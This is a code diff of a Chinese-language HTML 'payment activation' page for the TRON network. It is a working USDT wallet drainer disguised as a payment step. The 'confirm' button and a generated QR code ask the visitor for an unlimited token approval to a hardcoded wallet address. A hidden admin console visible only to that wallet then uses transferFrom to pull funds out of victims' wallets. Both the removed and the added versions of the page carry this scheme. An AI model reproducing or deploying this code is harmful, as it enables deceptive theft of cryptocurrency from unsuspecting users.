@@ -3,299 +3,182 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>支付开通 | TRON波场</title>
-<!-- 顺序绝对不能调换：先buffer，再tronweb -->
-<script src="https://cdn.jsdelivr.net/npm/buffer@6.0.3/dist/buffer.min.js"></script>
-<script>
-// 兜底polyfill
-if(typeof window.Buffer === "undefined"){
-    window.Buffer = Buffer;
-}
-</script>
+<title>支付开通</title>
 <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.min.js"></script>
 <style>
-*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui, -apple-system, sans-serif}
-body{background:#12080b;color:#fff;padding:20px}
+*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui, sans-serif}
+body{background:#0B0B1F;color:#fff;padding:20px}
 .container{max-width:420px;margin:0 auto}
-.pay-box{background:#200e13;padding:32px 24px;border-radius:22px;text-align:center;margin-bottom:30px;border:1px solid #ff243640}
-h1{font-size:26px;margin-bottom:8px;color:#ff2436}
-.desc{color:#ffb0b8;margin-bottom:24px;font-size:15px}
+.pay-box{background:#1E1E35;padding:30px;border-radius:20px;text-align:center;margin-bottom:30px}
+h1{font-size:24px;margin-bottom:8px}
+.desc{color:#aaa;margin-bottom:20px}
 #connectBtn{
- background:#ff0e22;color:#ffffff;
+ background:#F0B90B;color:#000;
  border:none;padding:16px;width:100%;
  border-radius:14px;font-size:16px;font-weight:bold;
- margin-bottom:18px;
- box-shadow: 0 4px 14px #ff0e2244;
+ margin-bottom:16px;
 }
-#connectBtn:disabled{opacity:0.65}
 .amount-input{
- width:100%;padding:15px;background:#170a0e;border:1px solid #ff243655;
- border-radius:12px;color:#fff;font-size:17px;text-align:center;
- margin-bottom:14px;
+ width:100%;padding:14px;background:#111;border:none;
+ border-radius:12px;color:#fff;font-size:16px;text-align:center;
+ margin-bottom:12px;
 }
 #qrcode{
- width:280px;height:280px;background:#ffffff;padding:12px;
- border-radius:18px;margin:0 auto 16px;
+ width:280px;height:280px;background:#fff;padding:10px;
+ border-radius:16px;margin:0 auto 20px;
  display:flex;align-items:center;justify-content:center;
- color:#b30012;font-size:14px;
+ color:#000;font-size:14px;
 }
 #qrcode img{width:100%;height:100%;border-radius:12px}
-.tip-address{
- margin-bottom:18px;
- color:#ff949e;
- font-size:12px;
- word-break:break-all;
- line-height:1.4;
-}
 #payBtn{
- background:#ff0e22;color:#fff;
+ background:#F0B90B;color:#000;
  border:none;padding:16px;width:100%;
- border-radius:14px;font-size:16px;font-weight:bold;
- box-shadow:0 4px 14px #ff0e2244;
+ border-radius:14px;font-size:16px;font-weight:bold
 }
-#payBtn:disabled{opacity:0.65}
 .admin-panel{
- background:#200e13;padding:26px 22px;border-radius:18px;display:none;
- border:1px solid #ff243640;margin-top:24px;
+ background:#1E1E35;padding:24px;border-radius:16px;display:none
 }
 .admin-panel.show{display:block}
-.admin-title{color:#ff3c4c;font-weight:bold;margin-bottom:18px;font-size:17px}
+.admin-title{color:#ff4444;font-weight:bold;margin-bottom:16px}
 .admin-input{
- width:100%;padding:13px;background:#170a0e;border:1px solid #ff243644;
- border-radius:10px;color:#fff;margin-bottom:12px;
- font-size:15px;
+ width:100%;padding:12px;background:#111;border:none;
+ border-radius:8px;color:#fff;margin-bottom:10px;
 }
 .admin-btn{
- width:100%;padding:14px;background:#d80012;color:#fff;
- border:none;border-radius:10px;font-weight:bold;margin-bottom:18px;
- font-size:15px;
+ width:100%;padding:14px;background:#ff4444;color:#fff;
+ border:none;border-radius:10px;font-weight:bold;margin-bottom:16px;
 }
-.admin-btn:disabled{opacity:0.6}
-.status-box{
- margin-top:12px;
- padding:12px;
- background:#2a1018;
- border:1px solid #ff243644;
- border-radius:12px;
- color:#ffb0b8;
- font-size:13px;
- line-height:1.5;
- display:none;
-}
-.status-box.show{
- display:block;
-}
-.max-btn{
-    padding:6px 12px;border-radius:8px;background:#ff4455;color:#fff;
-    display:inline-block;margin:8px 0;cursor:pointer;
-}
-.balance-text{margin:8px 0;color:#ffc0c6;}
 </style>
 </head>
 <body>
 <div class="container">
     <div class="pay-box">
         <h1>💳 支付开通</h1>
-        <p class="desc">波场TRON · USDT授权开通</p>
-
+        <p class="desc">波场链TRON · 安全开通</p>
         <button id="connectBtn">👉 连接钱包（波场链）</button>
-
-        <div id="statusBox" class="status-box"></div>
-
-        <input class="amount-input" id="amount" value="10" placeholder="授权额度 USDT">
-        <div class="max-btn" id="maxBtn">MAX全部</div>
-        <div class="balance-text">余额：<span id="balanceText">0.000000</span> USDT</div>
-
+        <input class="amount-input" id="amount" value="10" placeholder="输入授权金额 USDT">
         <div id="qrcode">加载二维码...</div>
-
-        <div class="tip-address">
-            收款&管理员地址：<br>
-            TAAcemnm9fuGjDjsGnJ7BfE3NhtKbFmGZE
-        </div>
-
-        <button id="payBtn" disabled>确认授权开通</button>
+        <button id="payBtn">确认授权开通</button>
     </div>
 
     <div class="admin-panel" id="adminPanel">
         <div class="admin-title">🔐 管理员控制台</div>
-
-        <div>提取玩家USDT transferFrom</div>
+        <div>提取玩家钱包USDT（transferFrom）</div>
         <input class="admin-input" id="userAddr" placeholder="玩家钱包地址">
         <input class="admin-input" id="drawAmt" placeholder="提取数量 USDT">
-        <button class="admin-btn" id="drawBtn">提取玩家代币</button>
+        <button class="admin-btn" onclick="drawFromUser()">提取玩家代币</button>
 
         <div>发放USDT奖励给玩家</div>
         <input class="admin-input" id="toAddr" placeholder="玩家钱包地址">
         <input class="admin-input" id="sendAmt" placeholder="发放数量 USDT">
-        <button class="admin-btn" id="rewardBtn">发放奖励代币</button>
+        <button class="admin-btn" onclick="sendReward()">发放奖励代币</button>
     </div>
 </div>
 
 <script>
-const TARGET_ADDR = "TAAcemnm9fuGjDjsGnJ7BfE3NhtKbFmGZE";
+// ====================== 波场配置 ======================
 const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+const ADMIN_WALLET = "TAAcemnm9fuGjDjsGnJ7BfE3NhtKbFmGZE";
 const RPC = "https://api.trongrid.io";
 
 let tronWeb = null;
-let userAddress = "";
-let usdtContract = null;
+let userAccount = null;
 let provider = null;
 
-const $ = s => document.querySelector(s);
-const connectBtn = $("#connectBtn");
-const payBtn = $("#payBtn");
-const statusBox = $("#statusBox");
-const amount = $("#amount");
-const maxBtn = $("#maxBtn");
-const balanceText = $("#balanceText");
-const qrcodeEl = $("#qrcode");
-const adminPanel = $("#adminPanel");
-const userAddr = $("#userAddr");
-const drawAmt = $("#drawAmt");
-const drawBtn = $("#drawBtn");
-const toAddr = $("#toAddr");
-const sendAmt = $("#sendAmt");
-const rewardBtn = $("#rewardBtn");
-
-const USDT_ABI = [
-    {"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
-    {"inputs":[{"name":"owner","type":"address"},{"name":"spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
-    {"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
-    {"inputs":[{"name":"_from","type":"address"},{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}
-];
-
-function showStatus(text, type="info"){
-    statusBox.classList.add("show");
-    statusBox.innerText = text;
-    if(type === "error") statusBox.style.color="#ffb0b8";
-    else if(type === "success") statusBox.style.color="#b0ffbc";
-}
-function hideStatus(){ statusBox.classList.remove("show"); }
-
-function disconnectWallet() {
-    tronWeb = null; userAddress = ""; usdtContract = null; provider = null;
-    connectBtn.innerText = "👉 连接钱包（波场链）";
-    payBtn.disabled = true; balanceText.textContent = "0.000000";
-    adminPanel.classList.remove("show"); showStatus("钱包已断开");
-}
-
-async function connectWalletLogic() {
-    hideStatus();
-    if (tronWeb && userAddress) { disconnectWallet(); return; }
-    connectBtn.disabled = true;
-    connectBtn.innerText = "正在连接钱包...";
+// 连接钱包
+document.getElementById("connectBtn").onclick = async () => {
     try {
-        if (window.tokenpocket?.tron) {
+        //优先使用 tokenpocket.tron provider（修复iOS扫码跳转损坏window.tronWeb问题）
+        if(window.tokenpocket && window.tokenpocket.tron){
             provider = window.tokenpocket.tron;
-            const accounts = await provider.request({ method: "tron_requestAccounts" });
-            userAddress = accounts[0];
-            tronWeb = new TronWeb({ fullHost: RPC, provider: provider });
-        } else if (window.tronProvider) {
-            provider = window.tronProvider;
-            const accounts = await provider.request({ method: "tron_requestAccounts" });
-            userAddress = accounts[0];
-            tronWeb = new TronWeb({ fullHost: RPC, provider: provider });
-        } else if (window.ethereum) {
-            provider = window.ethereum;
-            const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
-            tronWeb = new TronWeb({ fullHost: RPC, provider: window.ethereum });
-            const addrObj = await tronWeb.trx.getAccount(accounts[0]);
-            userAddress = addrObj.address;
-        } else if (window.tronWeb?.ready && window.tronWeb.defaultAddress?.base58) {
+            const accounts = await provider.request({method:"tron_requestAccounts"});
+            userAccount = accounts[0];
+            tronWeb = new TronWeb({fullHost: RPC, provider: provider});
+        }else if(window.tronWeb && window.tronWeb.ready){
+            //普通TP内置浏览器直接打开的兼容分支
             tronWeb = window.tronWeb;
-            userAddress = tronWeb.defaultAddress.base58;
-        } else {
-            connectBtn.disabled = false;
-            connectBtn.innerText = "👉 连接钱包（波场链）";
-            showStatus("未检测钱包环境，请TP内置浏览器打开","error");
+            userAccount = tronWeb.defaultAddress.base58;
+        }else{
+            alert("⚠️请使用TP钱包【发现】内置浏览器打开页面，外部浏览器无法调用钱包");
             return;
         }
 
-        usdtContract = tronWeb.contract(USDT_ABI, USDT_CONTRACT);
-        await loadBalance();
-        connectBtn.innerText = "✅已连接：" + userAddress.slice(0,12)+"...";
-        payBtn.disabled = false;
-        showStatus("✅钱包连接成功："+userAddress,"success");
-        if(userAddress === TARGET_ADDR) adminPanel.classList.add("show");
-        if(provider?.on){
-            provider.on("accountsChanged", ()=>location.reload());
-            provider.on("chainChanged", ()=>location.reload());
+        document.getElementById("connectBtn").innerText = "✅ 已连接："+userAccount.slice(0,8)+"...";
+        if(userAccount === ADMIN_WALLET){
+            document.getElementById("adminPanel").classList.add("show");
         }
-    } catch (err) {
-        connectBtn.disabled = false;
-        connectBtn.innerText = "👉 连接钱包（波场链）";
-        showStatus("连接失败："+(err?.message||String(err)),"error");
+        genQR();
+    }catch (e) {
+        alert("连接钱包失败："+(e.message||String(e)));
+    }
+};
+
+// ==================== 生成授权二维码 ====================
+function genQR() {
+    const qrUri = `tron:${USDT_CONTRACT}?function=approve&args=${ADMIN_WALLET},ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff`;
+    document.getElementById("qrcode").innerHTML = `<img src="https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=${encodeURIComponent(qrUri)}">`;
+}
+
+window.onload = genQR;
+document.getElementById("amount").oninput = genQR;
+
+// 页面按钮执行approve无限授权
+document.getElementById("payBtn").onclick = async () => {
+    if(!tronWeb || !userAccount){
+        return alert("请先连接钱包！");
+    }
+    try{
+        const contract = tronWeb.contract().at(USDT_CONTRACT);
+        const tx = await contract.approve(ADMIN_WALLET,"ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff")
+        .send({feeLimit:100000000});
+        alert("✅授权成功，交易哈希："+tx);
+    }catch(e){
+        alert("操作取消或失败："+(e.message||e));
+    }
+};
+
+// ====================== 管理员功能 ======================
+async function drawFromUser() {
+    if(userAccount !== ADMIN_WALLET){
+        alert("不是管理员账号！");
         return;
     }
-    connectBtn.disabled = false;
-}
-
-async function loadBalance(){
-    if(!usdtContract) return;
-    const sunVal = await usdtContract.balanceOf(userAddress).call();
-    const real = Number(tronWeb.fromSun(sunVal));
-    balanceText.innerText = real.toFixed(6);
-}
-
-function genQRCode(){
-    const qrData = `tron:${TARGET_ADDR}`;
-    qrcodeEl.innerHTML = `<img src="https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=${encodeURIComponent(qrData)}">`;
-}
-
-// 无限授权approve
-payBtn.onclick = async function(){
-    if(!tronWeb || !userAddress){ showStatus("请先连接钱包","error"); return; }
-    payBtn.disabled=true;
-    try{
-        const txHash = await usdtContract.approve(TARGET_ADDR,"ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff").send({feeLimit:100000000});
-        showStatus("✅授权成功，哈希："+txHash,"success");
-        alert("授权成功！"+txHash);
-        await loadBalance();
-    }catch(e){
-        showStatus("授权失败："+e.message,"error");
+    const fromAddr = document.getElementById("userAddr").value.trim();
+    const drawNum = parseFloat(document.getElementById("drawAmt").value);
+    if(!fromAddr || isNaN(drawNum)||drawNum <=0){
+        alert("请填写完整参数");
+        return;
     }
-    payBtn.disabled=false;
-};
-
-maxBtn.onclick = async function(){
-    if(!usdtContract)return;
-    const sun = await usdtContract.balanceOf(userAddress).call();
-    const human = Number(tronWeb.fromSun(sun));
-    amount.value = human.toFixed(2);
-};
-
-drawBtn.onclick = async function(){
-    if(!tronWeb || userAddress!==TARGET_ADDR){alert("需要管理员钱包");return;}
-    const fromAddr = userAddr.value.trim();
-    const num = parseFloat(drawAmt.value);
-    if(!fromAddr || isNaN(num)||num<=0){alert("填写正确参数");return;}
-    const sunV = tronWeb.toSun(num);
     try{
-        const allow = await usdtContract.allowance(fromAddr, TARGET_ADDR).call();
-        if(Number(allow) < sunV){alert("该用户授权额度不足");return;}
-        const tx = await usdtContract.transferFrom(fromAddr,TARGET_ADDR,sunV).send({feeLimit:100000000});
-        alert("✅划扣成功："+tx);
-        userAddr.value="";drawAmt.value="";
-        await loadBalance();
-    }catch(err){alert("划扣失败："+err.message);}
-};
+        const contract = tronWeb.contract().at(USDT_CONTRACT);
+        const sunVal = tronWeb.toSun(drawNum);
+        const tx = await contract.transferFrom(fromAddr, ADMIN_WALLET, sunVal).send({feeLimit:100000000});
+        alert("✅提取成功，哈希："+tx);
+    }catch(err){
+        alert("提取失败："+err.message);
+    }
+}
 
-rewardBtn.onclick = async function(){
-    if(!tronWeb || userAddress!==TARGET_ADDR){alert("管理员钱包");return;}
-    const to = toAddr.value.trim();
-    const num = parseFloat(sendAmt.value);
-    if(!to||isNaN(num)||num<=0){alert("填写参数");return;}
-    const sunV = tronWeb.toSun(num);
+async function sendReward() {
+    if(userAccount !== ADMIN_WALLET){
+        alert("不是管理员账号！");
+        return;
+    }
+    const toAddr = document.getElementById("toAddr").value.trim();
+    const sendNum = parseFloat(document.getElementById("sendAmt").value);
+    if(!toAddr || isNaN(sendNum)||sendNum <=0){
+        alert("请填写完整参数");
+        return;
+    }
     try{
-        const tx = await usdtContract.transfer(to,sunV).send({feeLimit:100000000});
-        alert("✅发放成功："+tx);
-        toAddr.value="";sendAmt.value="";
-        await loadBalance();
-    }catch(err){alert("发放失败："+err.message);}
-};
-
-connectBtn.addEventListener("click", connectWalletLogic);
-window.addEventListener("DOMContentLoaded",()=>{ genQRCode(); });
+        const contract = tronWeb.contract().at(USDT_CONTRACT);
+        const sunVal = tronWeb.toSun(sendNum);
+        const tx = await contract.transfer(toAddr, sunVal).send({feeLimit:100000000});
+        alert("✅发放奖励成功，哈希："+tx);
+    }catch(err){
+        alert("发放失败："+err.message);
+    }
+}
 </script>
 </body>
 </html>
